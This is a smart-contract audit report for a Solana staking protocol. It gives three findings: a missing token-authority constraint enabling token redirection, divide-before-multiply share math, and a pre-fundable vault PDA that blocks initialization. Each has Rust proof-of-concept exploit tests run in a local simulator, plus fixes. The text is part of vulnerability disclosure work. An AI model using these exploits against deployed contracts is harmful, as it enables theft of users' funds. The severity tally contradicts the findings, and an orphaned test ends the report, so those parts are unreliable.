
# Audit - Frank Sol

## Project Overiew - Anchor staking protocol with liquid receipts, yield strategies, and fee routing.

### Findings - 1 High , 3 Medium

## Finding 1

- **Severity:** High
- **Researcher:** 772005himanshu (GitHub) + @Himansh71624010 (X)
- **Component:** `programs/stake_v2/src/instructions/stake.rs`
- **Location:** `Stake` account context, `user_franksol_ata` constraint (lines 30-34)


### Summary

The `Stake` instruction validates that `user_franksol_ata` is a token account with the correct mint (`franksol_mint`) but does **not** verify that the token account's authority matches the transaction signer. A user who stakes via a malicious or compromised Protocol can have their minted frankSOL redirected to an attacker-controlled token account. Their SOL enters the protocol vault, but the SPL tokens representing the deposit are minted to the attacker instead.

The corresponding `Unstake` instruction correctly includes the `token::authority = user` constraint, creating an asymmetry between the two instructions.

### Evidence

**`Stake` (missing constraint):**

```30:34:programs/stake_v2/src/instructions/stake.rs
    #[account(
        mut,
        token::mint = franksol_mint,
        // ← NO token::authority = user
    )]
    pub user_franksol_ata: Account<TokenAccount>,
```

**`Unstake` (correct constraint):**

```37:42:programs/stake_v2/src/instructions/unstake.rs
    #[account(
        mut,
        token::mint = franksol_mint,
        token::authority = user       // ← correctly enforced
    )]
    pub user_franksol_ata: Account<TokenAccount>,
```

### Impact

- **Direct fund theft:** The victim's SOL enters the vault permanently. The franksol tokens representing that deposit are minted to an attacker-controlled account. The attacker can liquidate these tokens at any time.
- **Victim lockout:** The victim's `user_position` records a phantom franksol balance they cannot burn/redeem, effectively bricking their `Unstake` path.
- **Attack preconditions:** The attacker must control the Protocol or frontend that builds the transaction. The victim must sign the transaction without independently verifying the `user_franksol_ata` account matches their own ATA. This is realistic because most users rely on Protocol frontends to construct transactions and sign via wallet adapters without inspecting individual account fields.

### PoC

Command to run test:

Add test to the FrankSol/programs/stake_v2/src/tests/test_missing_authority.rs

```bin
cargo test --package stake_v2 --test test_missing_authority -- --nocapture
```


```rust
use {
    anchor_lang_v2::{programs::{AssociatedToken, System, Token}, Id, InstructionData, ToAccountMetas},
    litesvm::LiteSVM,
    solana_instruction::{AccountMeta, Instruction},
    solana_keypair::Keypair,
    solana_message::{Message, VersionedMessage},
    solana_pubkey::Pubkey,
    solana_signer::Signer,
    solana_transaction::versioned::VersionedTransaction,
    std::{fs, path::PathBuf},
};

fn try_load_program_binary(name: &str) -> Option<Vec<u8>> {
    let manifest_dir = env!("CARGO_MANIFEST_DIR");
    let mut candidate_paths = vec![
        PathBuf::from(manifest_dir).join(format!("../../target/deploy/{}.so", name)),
        PathBuf::from(manifest_dir)
            .join(format!("../../target/sbf-solana-solana/release/{}.so", name)),
    ];
    if let Ok(target_dir) = std::env::var("CARGO_TARGET_DIR") {
        candidate_paths.push(PathBuf::from(&target_dir).join(format!("deploy/{}.so", name)));
        candidate_paths
            .push(PathBuf::from(target_dir).join(format!("sbf-solana-solana/release/{}.so", name)));
    }
    for path in candidate_paths {
        if let Ok(bytes) = fs::read(&path) {
            return Some(bytes);
        }
    }
    None
}

fn get_ata(wallet: &Pubkey, mint: &Pubkey) -> Pubkey {
    Pubkey::find_program_address(
        &[wallet.as_ref(), Token::id().as_ref(), mint.as_ref()],
        &AssociatedToken::id(),
    )
    .0
}

fn create_ata_instruction(payer: &Pubkey, owner: &Pubkey, mint: &Pubkey) -> Instruction {
    let ata = get_ata(owner, mint);
    Instruction {
        program_id: AssociatedToken::id(),
        accounts: vec![
            AccountMeta::new(*payer, true),
            AccountMeta::new(ata, false),
            AccountMeta::new_readonly(*owner, false),
            AccountMeta::new_readonly(*mint, false),
            AccountMeta::new_readonly(System::id(), false),
            AccountMeta::new_readonly(Token::id(), false),
        ],
        data: vec![],
    }
}

/// Read the `amount` field from a raw SPL Token Account (offset 64, 8 bytes LE).
fn read_token_balance(svm: &LiteSVM, ata: &Pubkey) -> u64 {
    let acct = svm.get_account(ata).expect("ATA account not found");
    u64::from_le_bytes(acct.data[64..72].try_into().unwrap())
}

#[test]
fn test_malicious_redirects_franksol_to_attacker() {
    let stake_v2_id = stake_v2::id();

    let admin = Keypair::new();
    let victim = Keypair::new();       
    let attacker = Keypair::new();      
    let fund_manager = Keypair::new();
    let treasury = Keypair::new();

    let mut svm = LiteSVM::new();

    let Some(stake_v2_bytes) = try_load_program_binary("stake_v2") else {
        eprintln!("Skipping: no stake_v2.so found.");
        return;
    };

    svm.add_program(stake_v2_id, &stake_v2_bytes).unwrap();
    svm.airdrop(&admin.pubkey(), 20_000_000_000).unwrap();
    svm.airdrop(&victim.pubkey(), 20_000_000_000).unwrap();
    svm.airdrop(&attacker.pubkey(), 20_000_000_000).unwrap();

    let (pool_pda, _) = Pubkey::find_program_address(&[b"pool"], &stake_v2_id);
    let (vault_pda, _) = Pubkey::find_program_address(&[b"vault"], &stake_v2_id);
    let (mint_auth_pda, _) = Pubkey::find_program_address(&[b"mint_auth"], &stake_v2_id);
    let (franksol_mint_pda, _) = Pubkey::find_program_address(&[b"franksol_mint"], &stake_v2_id);
    let token_program_id = Token::id();

    // ─── 1. Initialize the pool ───────────────────────────────────────────
    println!("\n═══════════════════════════════════════════════════════════════");
    println!("  PoC: Malicious Protocol Redirects frankSOL to Attacker");
    println!("═══════════════════════════════════════════════════════════════\n");

    let initialize_ix = Instruction::new_with_bytes(
        stake_v2_id,
        &stake_v2::instruction::Initialize {}.data(),
        stake_v2::accounts::Initialize {
            admin: admin.pubkey(),
            fund_manager: fund_manager.pubkey(),
            treasury: treasury.pubkey(),
            pool: pool_pda,
            mint_authority: mint_auth_pda,
            franksol_mint: franksol_mint_pda,
            vault: vault_pda,
            token_program: token_program_id,
            system_program: System::id(),
        }
        .to_account_metas(None),
    );
    let blockhash = svm.latest_blockhash();
    let msg = Message::new_with_blockhash(&[initialize_ix], Some(&admin.pubkey()), &blockhash);
    let tx = VersionedTransaction::try_new(VersionedMessage::Legacy(msg), &[&admin]).unwrap();
    svm.send_transaction(tx).unwrap();
    println!("[1] Pool initialized by admin\n");

    // ─── 2. Create ATAs for both victim and attacker ──────────────────────
    let victim_ata = get_ata(&victim.pubkey(), &franksol_mint_pda);
    let attacker_ata = get_ata(&attacker.pubkey(), &franksol_mint_pda);

    // Attacker pre-creates their own ATA (they control the Protocol, so they
    // can ensure their ATA exists before the victim's stake tx is built).
    let blockhash = svm.latest_blockhash();
    let msg = Message::new_with_blockhash(
        &[create_ata_instruction(&attacker.pubkey(), &attacker.pubkey(), &franksol_mint_pda)],
        Some(&attacker.pubkey()),
        &blockhash,
    );
    let tx = VersionedTransaction::try_new(VersionedMessage::Legacy(msg), &[&attacker]).unwrap();
    svm.send_transaction(tx).unwrap();

    // Victim creates their own ATA (normal user behavior).
    let blockhash = svm.latest_blockhash();
    let msg = Message::new_with_blockhash(
        &[create_ata_instruction(&victim.pubkey(), &victim.pubkey(), &franksol_mint_pda)],
        Some(&victim.pubkey()),
        &blockhash,
    );
    let tx = VersionedTransaction::try_new(VersionedMessage::Legacy(msg), &[&victim]).unwrap();
    svm.send_transaction(tx).unwrap();
    println!("[2] Both victim and attacker have franksol ATAs created\n");

    // ─── 3. Malicious Protocol builds Stake tx with attacker's ATA ────────────
    let stake_amount = 1_000_000_000_u64; // 1 SOL in lamports

    let (victim_position_pda, _) = Pubkey::find_program_address(
        &[b"user_position", victim.pubkey().as_ref()],
        &stake_v2_id,
    );

    let malicious_stake_ix = Instruction::new_with_bytes(
        stake_v2_id,
        &stake_v2::instruction::Stake {
            amount_sol: stake_amount,
            min_franksol_out: 0,
        }
        .data(),
        stake_v2::accounts::Stake {
            user: victim.pubkey(),             // victim is the signer
            pool: pool_pda,
            vault: vault_pda,
            franksol_mint: franksol_mint_pda,
            mint_authority: mint_auth_pda,
            user_franksol_ata: attacker_ata,   // ← ATTACKER'S ATA (the exploit!)
            user_position: victim_position_pda,
            token_program: token_program_id,
            system_program: System::id(),
        }
        .to_account_metas(None),
    );

    println!("[3] Malicious Protocol constructed Stake tx:");
    println!("    Signer (victim):           {}", victim.pubkey());
    println!("    user_franksol_ata (WRONG):  {} (attacker's ATA!)", attacker_ata);
    println!("    Expected ATA (victim's):    {}\n", victim_ata);

    // Victim signs the transaction (simulating wallet adapter approval)
    let blockhash = svm.latest_blockhash();
    let msg = Message::new_with_blockhash(
        &[malicious_stake_ix],
        Some(&victim.pubkey()),
        &blockhash,
    );
    let tx = VersionedTransaction::try_new(VersionedMessage::Legacy(msg), &[&victim]).unwrap();

    // This SHOULD fail if token::authority = user was enforced.
    // But it SUCCEEDS because the constraint is missing!
    svm.send_transaction(tx).expect(
        "Stake with attacker's ATA should have been REJECTED but was ACCEPTED — bug confirmed!"
    );
    println!("[!] Victim staked {} lamports via malicious Protocol — tx SUCCEEDED (bug!)\n", stake_amount);

    // ─── 4. Verify: franksol went to ATTACKER, not VICTIM ─────────────────
    let attacker_balance = read_token_balance(&svm, &attacker_ata);
    let victim_balance = read_token_balance(&svm, &victim_ata);

    println!("─── Token Balances After Stake ───");
    println!("    Attacker's ATA: {} franksol  ← STOLEN", attacker_balance);
    println!("    Victim's ATA:   {} franksol  ← EMPTY\n", victim_balance);

    assert_eq!(attacker_balance, stake_amount, "Attacker received the victim's franksol!");
    assert_eq!(victim_balance, 0, "Victim's ATA is empty — tokens were redirected!");

    // ─── 5. Verify: victim's position has phantom balance ─────────────────
    let pos_account = svm.get_account(&victim_position_pda).unwrap();
    let pos: &stake_v2::state::UserPosition = bytemuck::from_bytes(&pos_account.data[8..]);

    println!("─── Victim's On-Chain Position ───");
    println!("    position.franksol_balance: {} (phantom!)", pos.franksol_balance.get());
    println!("    position.sol_deposited:    {} (real SOL lost!)", pos.sol_deposited.get());
    println!("    actual token balance:      {} (cannot unstake!)\n", victim_balance);

    assert_eq!(
        pos.franksol_balance.get(),
        stake_amount,
        "Position claims victim has franksol — but they don't!"
    );
    assert_eq!(
        pos.sol_deposited.get(),
        stake_amount,
        "Victim's SOL was deposited into the vault"
    );

    // ─── 6. Summary ───────────────────────────────────────────────────────
    println!("═══════════════════════════════════════════════════════════════");
    println!("  RESULT: Malicious Protocol Token Theft CONFIRMED");
    println!("═══════════════════════════════════════════════════════════════");
    println!("  Victim deposited:  {} lamports of SOL", stake_amount);
    println!("  Victim received:   0 franksol (tokens stolen!)");
    println!("  Attacker received: {} franksol (free money!)", attacker_balance);
    println!("  Victim can unstake? NO — burn will fail (0 tokens in ATA)");
    println!("  Attacker can sell franksol on DEX? YES");
    println!("═══════════════════════════════════════════════════════════════\n");
}

```

OutPut

```

═══════════════════════════════════════════════════════════════
  PoC: Malicious Protocol Redirects frankSOL to Attacker
═══════════════════════════════════════════════════════════════

[1] Pool initialized by admin

[2] Both victim and attacker have franksol ATAs created

[3] Malicious Protocol constructed Stake tx:
    Signer (victim):           3p2wfGRG44RKakYgy6Xu8meQAZv4BQd2t7UD23D2BEbd
    user_franksol_ata (WRONG):  FV8p8SrkBfG6F8oTURzEirvEbjL8hxXgox9KP3q6RqFk (attacker's ATA!)
    Expected ATA (victim's):    2sGCYaS6dof8G1ACXF9sCcVnD9jg87XYsxLTB6NLEgVa

[!] Victim staked 1000000000 lamports via malicious Protocol — tx SUCCEEDED (bug!)

─── Token Balances After Stake ───
    Attacker's ATA: 1000000000 franksol  ← STOLEN
    Victim's ATA:   0 franksol  ← EMPTY

─── Victim's On-Chain Position ───
    position.franksol_balance: 1000000000 (phantom!)
    position.sol_deposited:    1000000000 (real SOL lost!)
    actual token balance:      0 (cannot unstake!)

═══════════════════════════════════════════════════════════════
  RESULT: Malicious Protocol Token Theft CONFIRMED
═══════════════════════════════════════════════════════════════
  Victim deposited:  1000000000 lamports of SOL
  Victim received:   0 franksol (tokens stolen!)
  Attacker received: 1000000000 franksol (free money!)
  Victim can unstake? NO — burn will fail (0 tokens in ATA)
  Attacker can sell franksol on DEX? YES
═══════════════════════════════════════════════════════════════

test test_malicious_redirects_franksol_to_attacker ... ok
```

### Recommendation

Add `token::authority = user` to match the `Unstake` constraint:

```rust
    #[account(
        mut,
        token::mint = franksol_mint,
        token::authority = user,       // ← add this
    )]
    pub user_franksol_ata: Account<TokenAccount>,
```

This ensures the program cryptographically verifies that the token account receiving minted franksol belongs to the signer, preventing any third party from redirecting the minted tokens.


## Finding 2

- **Severity:** High
- **Researcher:** 772005himanshu (GitHub) + @Himansh71624010 (X)
- **Component:** `programs/stake_v2/src/utils.rs`
- **Location:** `sol_to_franksol` function


### Summary

The `sol_to_franksol` function calculates the amount of pool shares (`franksol`) to mint for a given `sol_in` deposit. The formula implements the standard share calculation: `(amount * total_supply) / total_pool_assets`. 

However, the implementation executes the division *before* the multiplication:
```rust
    // precision loss here multiply before the divide 
    let out = (sol_in as u128)
        .checked_div(total_sol as u128)
        .ok_or(StakeError::MathOverflow)?
        .checked_mul(supply as u128)
        .ok_or(StakeError::MathOverflow)?;
```
Because Rust uses integer division, any remainder from `sol_in / total_sol` is immediately truncated to zero before being multiplied by `supply`. 

### Impact

1. **Complete Staking Lockout for Small Deposits:** If a user deposits an amount of SOL (`sol_in`) that is strictly less than the total SOL in the pool (`total_sol`), the division `sol_in / total_sol` evaluates to `0`. The function then returns an `InvalidAmount` error, completely preventing the user from staking. As the pool grows, the minimum staking amount grows with it.
2. **Massive Value Loss:** If a user deposits an amount greater than `total_sol`, the fractional remainder is lost. For example, if `total_sol` is 1,000 SOL and a user deposits 1,900 SOL, `1900 / 1000 = 1`. The user is minted shares as if they only deposited 1,000 SOL, permanently losing 900 SOL of value which gets absorbed by the pool (benefitting existing holders).

### Root Cause

Mathematical operations that involve division must be performed *last* to preserve precision. By dividing before multiplying, the intermediate result is aggressively truncated.


### Proof Of Concept

the formula does (sol_in / total_sol) * supply instead of (sol_in * supply) / total_sol.


Calculation of the Precision loss bug:


---

#### Step 1 — User A Stakes 1,000,000,000 lamports (Pool Bootstrap)

| Field | Value |
|---|---|
| `sol_in` | `1,000,000,000` |
| `total_sol` (before) | `0` |
| `supply` (before) | `0` |

Since `supply == 0 || total_sol == 0`, the code returns `sol_in` directly (1:1 mint):
```
shares_out = sol_in = 1,000,000,000   ✓
```

**Pool state after:**
| `total_sol` | `franksol_supply` | User A shares |
|---|---|---|
| `1,000,000,000` | `1,000,000,000` | `1,000,000,000` |

---

#### Step 2 — User B Stakes 1,999,999,999 lamports (Value Theft)

| Field | Value |
|---|---|
| `sol_in` | `1,999,999,999` |
| `total_sol` (before) | `1,000,000,000` |
| `supply` (before) | `1,000,000,000` |

**Buggy calculation (divide-first):**
```
Step 1:  sol_in / total_sol
         = 1,999,999,999 / 1,000,000,000
         = 1                                  ← integer truncation! (real: 1.999999999)

Step 2:  result * supply
         = 1 × 1,000,000,000
         = 1,000,000,000

shares_out = 1,000,000,000                    ✗ WRONG
```

**Correct calculation (multiply-first):**
```
Step 1:  sol_in * supply
         = 1,999,999,999 × 1,000,000,000
         = 1,999,999,999,000,000,000          (fits in u128)

Step 2:  result / total_sol
         = 1,999,999,999,000,000,000 / 1,000,000,000
         = 1,999,999,999

shares_out = 1,999,999,999                    ✓ CORRECT
```

> User B deposited 1,999,999,999 lamports but received only 1,000,000,000 shares.
> **999,999,999 lamports of value (~50% of deposit) permanently stolen** — absorbed into the pool, inflating User A's share value.

**Pool state after:**
| `total_sol` | `franksol_supply` | User A shares (%) | User B shares (%) |
|---|---|---|---|
| `2,999,999,999` | `2,000,000,000` | `1,000,000,000` (50%) | `1,000,000,000` (50%) |

User A now owns 50% of a pool worth ~3B lamports despite depositing only ~1B. User B owns 50% despite depositing ~2B.

---

#### Step 3 — User C Attempts to Stake 999,999,999 lamports (Complete Lockout)

| Field | Value |
|---|---|
| `sol_in` | `999,999,999` |
| `total_sol` (before) | `2,999,999,999` |
| `supply` (before) | `2,000,000,000` |

**Buggy calculation:**
```
Step 1:  sol_in / total_sol
         = 999,999,999 / 2,999,999,999
         = 0                                  ← integer truncation! (real: 0.333...)

Step 2:  result * supply
         = 0 × 2,000,000,000
         = 0

shares_out = 0  →  triggers InvalidAmount error!   ✗ REVERTED
```

**Correct calculation:**
```
Step 1:  sol_in * supply
         = 999,999,999 × 2,000,000,000
         = 1,999,999,998,000,000,000

Step 2:  result / total_sol
         = 1,999,999,998,000,000,000 / 2,999,999,999
         = 666,666,666

shares_out = 666,666,666                      ✓ CORRECT
```

> User C is **completely locked out of staking**. Any `sol_in < total_sol` produces 0 shares and reverts.

---

#### Impact Summary

| User | SOL Deposited | Shares (Buggy) | Shares (Correct) | Loss |
|---|---|---|---|---|
| A | 1,000,000,000 | 1,000,000,000 | 1,000,000,000 | 0 (bootstrap) |
| B | 1,999,999,999 | 1,000,000,000 | 1,999,999,999 | **999,999,999 lamports** |
| C | 999,999,999 | **TX REVERTED** | 666,666,666 | **Total lockout** |

Note: Multiplying first is safe because `u128` can hold `u64::MAX × u64::MAX ≈ 3.4 × 10^38` without overflow (`u128::MAX ≈ 3.4 × 10^38`).



### Recommendation

Reverse the order of operations in `sol_to_franksol`. Multiply `sol_in` by `supply` first, then divide by `total_sol`:

```rust
    let out = (sol_in as u128)
        .checked_mul(supply as u128)
        .ok_or(StakeError::MathOverflow)?
        .checked_div(total_sol as u128)
        .ok_or(StakeError::MathOverflow)?;
```


## Finding 3

- **Severity:** High
- **Researcher:** 772005himanshu (GitHub) + @Himansh71624010 (X)
- **Component:** `programs/stake_v2/src/instructions/initialize.rs`
- **Location:** `initialize` handler, `CreateAccount` flow for `vault`

### Summary

The protocol's `initialize` instruction dynamically creates the `vault` PDA account via a cross-program invocation (CPI) to the System Program. The implementation verifies if the account lacks data (`ctx.accounts.vault.account().data_len() == 0`) and directly invokes `CreateAccount` if true.

However, Solana's `SystemProgram::create_account` explicitly aborts if the destination account already contains a non-zero lamport balance. An attacker can trivially predict the deterministic PDA address of the `vault` (`[b"vault"]` seeds) and transfer a single lamport (dust) to it prior to the admin calling `initialize`. Because the account remains data-less (`data_len() == 0`), the `CreateAccount` CPI is still triggered but fails at the runtime level. 

### Impact

- **Permanent Denial of Service**: Protocol deployment can be permanently griefed. Once the `vault` PDA is prefunded, the `create_account` instruction will consistently revert.
- **Unrecoverable State**: Because the `vault` PDA is not assigned to the `stake_v2` program, the protocol lacks the authority to withdraw the malicious lamports. The admin cannot bypass the `initialize` step, rendering the program effectively undeployable without rotating PDA seeds or applying an immediate source code patch.

### Root Cause

- The manual account creation logic incorrectly assumes that `data_len() == 0` is a sufficient condition for `CreateAccount`. 
- `SystemProgram::create_account` requires the target address to be completely unallocated (i.e., `lamports == 0` and `owner == SystemProgram`). A pre-funded account holds `lamports > 0`, causing the `Allocate` and `Assign` internal sub-operations of `CreateAccount` to panic.

### Evidence

In `programs/stake_v2/src/instructions/initialize.rs`:

```rust
    if ctx.accounts.vault.account().data_len() == 0 {
        let vault_bump_bytes = [ctx.bumps.vault];
        let seeds = [Seed::from(VAULT_SEED), Seed::from(&vault_bump_bytes[..])];
        let signer = CpiSigner::from(&seeds);
        CreateAccount {
            from: ctx.accounts.admin.account(),
            to: ctx.accounts.vault.account(),
            lamports: anchor_lang_v2::cpi::rent_exempt_lamports(0)?,
            space: 0,
            owner: ctx.program_id,
        }
        .invoke_signed(&[signer])?;
    } else {
        return Err(StakeError::AlreadyInitialized.into());
    }
```

When an attacker transfers lamports to `ctx.accounts.vault.address()`, `data_len()` is still 0. The program enters the `if` block, but `CreateAccount::invoke_signed` crashes with a System Program error (`AccountAlreadyInUse`).


## Proof Of Concept

Command to run test:

Add test to the FrankSol/programs/stake_v2/src/tests/test_prefund_dos.rs


```bin
cargo test --package stake_v2 --test test_prefund_dos
```


```rust
use {
    anchor_lang_v2::{programs::System, Id, InstructionData, ToAccountMetas},
    litesvm::LiteSVM,
    solana_instruction::Instruction,
    solana_keypair::Keypair,
    solana_message::{Message, VersionedMessage},
    solana_pubkey::Pubkey,
    solana_signer::Signer,
    solana_transaction::versioned::VersionedTransaction,
    std::{fs, path::PathBuf},
};

fn try_load_program_binary(name: &str) -> Option<Vec<u8>> {
    let manifest_dir = env!("CARGO_MANIFEST_DIR");
    let mut candidate_paths = vec![
        PathBuf::from(manifest_dir).join(format!("../../target/deploy/{}.so", name)),
        PathBuf::from(manifest_dir)
            .join(format!("../../target/sbf-solana-solana/release/{}.so", name)),
    ];

    if let Ok(target_dir) = std::env::var("CARGO_TARGET_DIR") {
        candidate_paths.push(PathBuf::from(&target_dir).join(format!("deploy/{}.so", name)));
        candidate_paths
            .push(PathBuf::from(target_dir).join(format!("sbf-solana-solana/release/{}.so", name)));
    }

    for path in candidate_paths {
        if let Ok(bytes) = fs::read(&path) {
            return Some(bytes);
        }
    }

    None
}

#[test]
fn test_prefund_vault_dos() {
    let stake_v2_id = stake_v2::id();

    let admin = Keypair::new();
    let fund_manager = Keypair::new();
    let treasury = Keypair::new();
    let mut svm = LiteSVM::new();

    let Some(stake_v2_bytes) = try_load_program_binary("stake_v2") else {
        eprintln!("Skipping: no stake_v2.so found.");
        return;
    };

    svm.add_program(stake_v2_id, &stake_v2_bytes).unwrap();
    svm.airdrop(&admin.pubkey(), 200_000_000_000).unwrap();

    let (pool_pda, _) = Pubkey::find_program_address(&[b"pool"], &stake_v2_id);
    let (vault_pda, _) = Pubkey::find_program_address(&[b"vault"], &stake_v2_id);
    let (mint_auth_pda, _) = Pubkey::find_program_address(&[b"mint_auth"], &stake_v2_id);
    let (franksol_mint_pda, _) = Pubkey::find_program_address(&[b"franksol_mint"], &stake_v2_id);

    // ATTACKER ACTION: Pre-fund the deterministic vault PDA before initialization
    // By transferring lamports to this PDA, the data_len() remains 0, but create_account will fail.
    svm.airdrop(&vault_pda, 1_000_000).unwrap();

    // Spl Token program ID
    let token_program_id = anchor_lang_v2::programs::Token::id();

    let initialize_ix = Instruction::new_with_bytes(
        stake_v2_id,
        &stake_v2::instruction::Initialize {}.data(),
        stake_v2::accounts::Initialize {
            admin: admin.pubkey(),
            fund_manager: fund_manager.pubkey(),
            treasury: treasury.pubkey(),
            pool: pool_pda,
            mint_authority: mint_auth_pda,
            franksol_mint: franksol_mint_pda,
            vault: vault_pda,
            token_program: token_program_id,
            system_program: System::id(),
        }
        .to_account_metas(None),
    );

    let blockhash = svm.latest_blockhash();
    let msg = Message::new_with_blockhash(&[initialize_ix], Some(&admin.pubkey()), &blockhash);
    let tx = VersionedTransaction::try_new(VersionedMessage::Legacy(msg), &[&admin])
        .expect("transaction should sign");
    
    let res = svm.send_transaction(tx);

    // We expect the transaction to fail because of the pre-funded vault PDA
    assert!(res.is_err(), "Initialization should fail due to prefunded vault PDA");

    let failed_meta = res.unwrap_err();
    
    // The failure happens inside the CPI to SystemProgram::CreateAccount.
    // SystemProgram CreateAccount returns AccountAlreadyInUse error when lamports > 0.
    // In solana this maps to SystemError::AccountAlreadyInUse which is 0.
    if let solana_transaction::TransactionError::InstructionError(
        0, // the instruction index
        solana_transaction::InstructionError::Custom(0), // SystemError::AccountAlreadyInUse
    ) = failed_meta.err
    {
        // Passed: System program correctly reverted due to AccountAlreadyInUse
    } else {
        panic!("Expected Custom(0) (AccountAlreadyInUse) Instruction error, but got {:?}", failed_meta.err);
    }
}

```


### Recommendation

Do not rely on `SystemProgram::create_account` for deterministic PDAs. Instead, handle account initialization flexibly. If the account is already funded, simply `Allocate` space and `Assign` the owner directly to the current program:

```rust
let vault_info = ctx.accounts.vault.account();
let required_lamports = anchor_lang_v2::cpi::rent_exempt_lamports(0)?;

// 1. Transfer missing lamports if it is not fully rent-exempt
let current_lamports = vault_info.lamports();
if current_lamports < required_lamports {
    pinocchio_system::instructions::Transfer {
        from: ctx.accounts.admin.account(),
        to: vault_info,
        lamports: required_lamports - current_lamports,
    }
    .invoke()?;
}

// 2. Allocate space and Assign ownership
let vault_bump_bytes = [ctx.bumps.vault];
let seeds = [Seed::from(VAULT_SEED), Seed::from(&vault_bump_bytes[..])];
let signer = CpiSigner::from(&seeds);

pinocchio_system::instructions::Allocate {
    account: vault_info,
    space: 0,
}
.invoke_signed(&[signer])?;

pinocchio_system::instructions::Assign {
    account: vault_info,
    owner: ctx.program_id,
}
.invoke_signed(&[signer])?;
```

Alternatively, leverage Anchor's native `init` macro, which inherently handles prefunded PDAs securely by conditionally executing `SystemProgram::transfer` and `SystemProgram::allocate`:
```rust
    #[account(
        init,
        payer = admin,
        space = 0,
        seeds = [VAULT_SEED],
        bump
    )]
    pub vault: UncheckedAccount<'info>,
```






fn try_load_program_binary(name: &str) -> Option<Vec<u8>> {
    let manifest_dir = env!("CARGO_MANIFEST_DIR");
    let mut candidate_paths = vec![
        PathBuf::from(manifest_dir).join(format!("../../target/deploy/{}.so", name)),
        PathBuf::from(manifest_dir)
            .join(format!("../../target/sbf-solana-solana/release/{}.so", name)),
    ];

    if let Ok(target_dir) = std::env::var("CARGO_TARGET_DIR") {
        candidate_paths.push(PathBuf::from(&target_dir).join(format!("deploy/{}.so", name)));
        candidate_paths
            .push(PathBuf::from(target_dir).join(format!("sbf-solana-solana/release/{}.so", name)));
    }

    for path in candidate_paths {
        if let Ok(bytes) = fs::read(&path) {
            return Some(bytes);
        }
    }

    None
}

#[test]
fn withdraw_from_yield_fails_with_illegal_owner() {
    let stake_v2_id = stake_v2::id();
    let yield_generator_id = yield_generator::id();

    let payer = Keypair::new();
    let mut svm = LiteSVM::new();

    let Some(stake_v2_bytes) = try_load_program_binary("stake_v2") else {
        eprintln!("Skipping: no stake_v2.so found.");
        return;
    };

    let Some(yield_bytes) = try_load_program_binary("yield_generator") else {
        eprintln!("Skipping: no yield_generator.so found.");
        return;
    };

    svm.add_program(stake_v2_id, &stake_v2_bytes).unwrap();
    svm.add_program(yield_generator_id, &yield_bytes).unwrap();
    svm.airdrop(&payer.pubkey(), 200_000_000_000).unwrap();

    let fund_manager = Keypair::new();
    svm.airdrop(&fund_manager.pubkey(), 1_000_000_000).unwrap();

    let (pool_pda, pool_bump) = Pubkey::find_program_address(&[b"pool"], &stake_v2_id);
    let (vault_pda, vault_bump) = Pubkey::find_program_address(&[b"vault"], &stake_v2_id);

    let (yield_state_pda, state_bump) =
        Pubkey::find_program_address(&[b"yield_state"], &yield_generator_id);
    let (yield_vault_pda, _) = Pubkey::find_program_address(&[b"yield_vault"], &yield_generator_id);
    let (yield_position_pda, pos_bump) = Pubkey::find_program_address(
        &[b"user_position", fund_manager.pubkey().as_ref()],
        &yield_generator_id,
    );

    // MOCK the Pool account to bypass unauthorized checks
    let mut pool_data = vec![0u8; 8 + std::mem::size_of::<stake_v2::state::Pool>()];
    let pool_disc = Sha256::digest("account:Pool".as_bytes())[..8].to_vec();
    pool_data[0..8].copy_from_slice(&pool_disc);
    let pool_struct = stake_v2::state::Pool {
        fund_manager: fund_manager.pubkey(),
        deployed_sol: anchor_lang_v2::prelude::PodU64::from(100_000_000_000),
        bump: pool_bump,
        vault_bump,
        ..Default::default()
    };
    pool_data[8..].copy_from_slice(bytemuck::bytes_of(&pool_struct));
    svm.set_account(
        pool_pda,
        solana_account::Account {
            lamports: 1_000_000_000,
            data: pool_data,
            owner: stake_v2_id,
            executable: false,
            rent_epoch: 0,
        },
    )
    .unwrap();

    // Mock the Yield accounts that are legitimately owned by yield_generator
    let mut state_data = vec![0u8; 8 + std::mem::size_of::<yield_generator::YieldState>()];
    let state_disc = Sha256::digest("account:YieldState".as_bytes())[..8].to_vec();
    state_data[0..8].copy_from_slice(&state_disc);
    let state_struct = yield_generator::YieldState {
        state_bump,
        ..Default::default()
    };
    state_data[8..].copy_from_slice(bytemuck::bytes_of(&state_struct));
    svm.set_account(
        yield_state_pda,
        solana_account::Account {
            lamports: 1_000_000_000,
            data: state_data,
            owner: yield_generator_id,
            executable: false,
            rent_epoch: 0,
        },
    )
    .unwrap();

    let mut pos_data = vec![0u8; 8 + std::mem::size_of::<yield_generator::UserPosition>()];
    let pos_disc = Sha256::digest("account:UserPosition".as_bytes())[..8].to_vec();
    pos_data[0..8].copy_from_slice(&pos_disc);
    let pos_struct = yield_generator::UserPosition {
        owner: fund_manager.pubkey(), // to pass the explicitly written instruction constraint
        bump: pos_bump,
        ..Default::default()
    };
    pos_data[8..].copy_from_slice(bytemuck::bytes_of(&pos_struct));
    svm.set_account(
        yield_position_pda,
        solana_account::Account {
            lamports: 1_000_000_000,
            data: pos_data,
            owner: yield_generator_id,
            executable: false,
            rent_epoch: 0,
        },
    )
    .unwrap();

    let withdraw_ix = Instruction::new_with_bytes(
        stake_v2_id,
        &stake_v2::instruction::WithdrawFromYield {
            principal_returned: 1_000,
            yield_amount: 0,
        }
        .data(),
        stake_v2::accounts::WithdrawFromYield {
            fund_manager: fund_manager.pubkey(),
            pool: pool_pda,
            vault: vault_pda,
            yield_state: yield_state_pda,
            yield_position: yield_position_pda,
            yield_vault: yield_vault_pda,
            yield_generator_program: yield_generator_id,
            system_program: System::id(),
        }
        .to_account_metas(None),
    );

    let blockhash = svm.latest_blockhash();
    let msg = Message::new_with_blockhash(&[withdraw_ix], Some(&fund_manager.pubkey()), &blockhash);
    let tx = VersionedTransaction::try_new(VersionedMessage::Legacy(msg), &[&fund_manager])
        .expect("transaction should sign");
    
    let res = svm.send_transaction(tx);

    assert!(res.is_err(), "Transaction should fail due to IllegalOwner constraint");

    let failed_meta = res.unwrap_err();
    if let solana_transaction::TransactionError::InstructionError(
        _,
        solana_transaction::InstructionError::IllegalOwner,
    ) = failed_meta.err
    {
        // Expected IllegalOwner due to constraint owner mismatch
    } else {
        panic!("Expected IllegalOwner Instruction error, but got {:?}", failed_meta.err);
    }
}

```

### Output
```rust
    Finished `test` profile [unoptimized + debuginfo] target(s) in 0.40s
     Running tests/test_withdraw_bug.rs (target/debug/deps/test_withdraw_bug-237a8725255eb353)

running 1 test
test withdraw_from_yield_fails_with_illegal_owner ... ok

